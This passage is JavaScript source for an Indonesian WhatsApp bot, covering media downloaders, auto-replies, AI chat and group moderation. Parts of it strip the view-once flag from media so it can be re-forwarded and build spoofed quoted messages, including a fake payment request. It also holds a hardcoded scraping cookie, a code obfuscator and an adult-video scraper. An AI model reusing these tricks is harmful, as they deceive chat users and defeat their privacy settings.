      result.artis = kemii.data.result.artists;
      result.durasi = kemii.data.result.duration_ms;
      result.image = kemii.data.result.image;
      result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};

async function searchSpotify(query) {
    try {
        const access_token = await getAccessToken();
        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
            headers: {
                Authorization: `Bearer ${access_token}`,
            },
        });
        const data = response.data;
        const tracks = data.tracks.items.map(item => ({
            name: item.name,
            artists: item.artists.map(artist => artist.name).join(', '),
            popularity: item.popularity,
            link: item.external_urls.spotify,
            image: item.album.images[0].url,
            duration_ms: item.duration_ms,
        }));
        return tracks;
    } catch (error) {
        console.error('Error searching Spotify:', error);
        throw 'An error occurred while searching for songs on Spotify.';
    }
}
async function mikupoxyHDvideo() {
  try {
    const inputVideo = await mikupoxy.downloadAndSaveMediaMessage(quoted);
    const outputVideo = 'output_2k.mp4';
    await new Promise((resolve, reject) => {
      ffmpeg(inputVideo)
        .outputOptions('-vf', 'scale=2560:1440')
        .on('start', commandLine => {
          console.log('Memulai proses dengan perintah:', commandLine);
        })
        .on('progress', progress => {
          console.log('Proses sedang berjalan:', progress.percent.toFixed(2) + '% selesai');
        })
        .on('end', () => {
          console.log('Proses selesai!');
          resolve();
        })
        .on('error', (err, stdout, stderr) => {
          console.error('Terjadi kesalahan:', err.message);
          console.error('stdout:', stdout);
          console.error('stderr:', stderr);
          reject(err);
        })
        .save(outputVideo);
    });
    const caption = 'Sukses membuat video menjadi HD';
    await mikupoxy.sendMessage(m.chat, { caption: caption, video: { url: path.resolve(outputVideo) } }, { quoted: m });

  } catch (error) {
   reply('Terjadi kesalahan:', error);
  }
}
//autoreply
for (let BhosdikaXeon of mikupoxyVoiceNote) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./data/assets/audio/${BhosdikaXeon}.mp3`)
mikupoxy.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of mikupoxySticker){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./data/Media/sticker/${BhosdikaXeon}.webp`)
mikupoxy.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of Imagemikupoxy){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./data/Media/image/${BhosdikaXeon}.jpg`)
mikupoxy.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of Videomikupoxy){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./data/Media/video/${BhosdikaXeon}.mp4`)
mikupoxy.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}
mikupoxy.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await mikupoxy.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}


const lep = {
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }
//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6281111111111:6281111111111\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./data/image/thumb.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await mikupoxy.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await mikupoxy.getName(i)}\nFN:${await mikupoxy.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${yt}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let xeonrecordin = ['recording','composing']
//let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]

if (!m.key.fromMe && db.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await mikupoxy.readMessages([readkey]);
}

mikupoxy.sendPresenceUpdate('available', m.chat)

if (global.autoTyping) {
if (command) {
mikupoxy.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
mikupoxy.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom.js")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await mikupoxy.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await mikupoxy.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const doloadmp3 = async (Link) => {
try{
let yutub = await y2matemp3(Link)
//if (yutub.size < 62914560) {
await mikupoxy.sendMessage(m.chat, {audio: { url: yutub.audio["128"].url }, mimetype: 'audio/mpeg', contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
title: "YOUTUBE - PLAY",
body: yutub.title,
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: yutub.thumbnail,
sourceUrl: Link
}
}},{ quoted: m })
/*} else {
await m.reply(`File audio ( ${bytesToSize(yutub.size)} ), telah melebihi batas maksimum!`)
}*/
} catch (err){
console.log(color(err))
}}


const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom.js")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await mikupoxy.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await mikupoxy.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}
//================================================================
if (m.isGroup && !m.key.fromMe && isAutosimi ) {
try {
const ainya = await fetchJson(`https://widipe.com/ai/c-ai?prompt=kamu adalah Inzie Hosting, yang memiliki sifat nyebelin dan galak, kamu memiliki chanel YouTube bernama Inzie Hosting&text=$${args.join(" ")}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
if (m.isGroup && isAutoAiGc) {
try {
const ainya = await fetchJson(`https://widipe.com/ai/c-ai?prompt=kamu adalah Inzie Hosting, yang memiliki sifat baik dan sopan, kamu memiliki chanel YouTube bernama Inzie Hosting&text=$${args.join(" ")}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
if (automati) {
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}
/*if (shouldExit) {
    nodecron.schedule('0 15 * * * *', () => {
        fs.readdir("./session", async function (err, files) {
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
if(filteredArray.length == 0) return console.log(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
await filteredArray.forEach(function (file) {
});
await sleep(2000)
console.log("Berhasil menghapus semua Kenangan di folder session")    
});
    })
}*/
if (!m.key.fromMe && m.isGroup && ismikupoxychat) {
  try {
const ainya = await fetchJson(`https://widipe.com/ai/c-ai?prompt=kamu adalah Inzie Hosting, yang memiliki sifat baik dan sopan, kamu memiliki chanel YouTube bernama Inzie Hosting&text=$${args.join(" ")}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
//=================================================================
if (!m.isGroup && !isOwner && db.settings[botNumber].onlygrub ) {
        	if (command){
            return;
            }
        }
//=================================================================
async function makeSticker(media,Sticker, StickerTypes){
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: global.author, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono.path);
await mikupoxy.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

async function sendPoll(jid, text, list) {
mikupoxy.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
hasil.push({
link: $(h).find('a').attr('href'),
gambar: $(h).find('img').attr('data-src'),
karakter: $(h).find('div.char-name').text().trim(),
anime: $(h).find('div.anime-title').text().trim(),
episode: $(h).find('div.meta').text(),
up_at: $(h).find('small.meta').text(),
quotes: $(h).find('div.quote').text().trim()
})
            })
            resolve(hasil)
        }).catch(reject)
    })
}


async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

mikupoxy.autoshalat = mikupoxy.autoshalat ? mikupoxy.autoshalat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? mikupoxy.user.id : m.sender
let id = m.chat 
if (id in mikupoxy.autoshalat) {
    return false
}
let jadwalSholat = {
    shubuh: '04:39',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
}
const datek = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }))
const hours = datek.getHours()
const minutes = datek.getMinutes()
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
/*for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        mikupoxy.autoshalat[id] = [
            mikupoxy.sendMessage(m.chat, {
                        audio: {
                            url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
                        },
                        mimetype: 'audio/mp4',
                        ptt: true,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                mediaType: 1,
                                mediaUrl: '',
                                title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
                                body: `🕑 ${waktu}`,
                                sourceUrl: '',
                                thumbnail: await fs.readFileSync('./data/image/jdw.png'),
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m,
                        mentions: participants.map(a => a.id)
                    }),
            setTimeout(async () => {
                delete mikupoxy.autoshalat[m.chat]
            }, 57000)
        ]
    }
}*/
async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
hasil.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
            })
            resolve(hasil)
        })
    })
}	

async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await mikupoxy.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await mikupoxy.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
//=========================================\\
// Auto download tiktok
  if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://t.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
reply(mess.wait)
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(budy)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*

*Video dari* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_

\`⏤͟͟͞͞ Downloader By ${botname}\`
`;
  mikupoxy.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
  const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(budy)}`)
  const videoUrl = response.result.video;
  const captionn = `*[ TIKTOK DOWNLOADER ]*

Likes: ${response.result.statistics.likeCount ?? ''}
Comments: ${response.result.statistics.commentCount ?? ''}
Shares: ${response.result.statistics.shareCount ?? ''}
by ${response.result.author.nickname ?? ''}

\`⏤͟͟͞͞ Downloader By ${botname}\`
  `;
  mikupoxy.sendMessage(m.chat, { caption: captionn, video: { url: videoUrl } }, { quoted: m })
}
  }
//=========================================\\
//Auto Download Video Instagram

//=========================================\\
//Auto Download Video Facebook
if(budy.includes('https://www.facebook.com/')){
const fg = require('api-dylux')
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return poxreply('Url invalid')
  }
  try {
    const result = await fg.fbdl(budy);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    mikupoxy.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    poxreply('Maybe private video!')
  }

}
//=========================================\\
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
mikupoxy.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
mikupoxy.sendMessage(m.chat, {
  image: await getBuffer(get_data_respon.image_url),
  caption: get_data_respon.response,
}, {
  quoted: m
})
}
}
//=========================================\\
        // Grup Only
        if (!m.isGroup && !isOwner && db.settings[botNumber].onlygrub ) {
        	if (isCmd){
            return  
            }
        }
        // Private Only
        if (!isOwner && db.settings[botNumber].onlypc && m.isGroup) {
        	if (isCmd){
	         return;
	     }
	}
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        let gclink = (`https://chat.whatsapp.com/`+await mikupoxy.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return mikupoxy.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Anda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
        if (isAdmins) return mikupoxy.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (isOwner) return mikupoxy.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
						
            mikupoxy.groupParticipantsUpdate(m.chat, [m.sender], from, {quoted:m});
            }            
        }

 // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
kice = m.sender
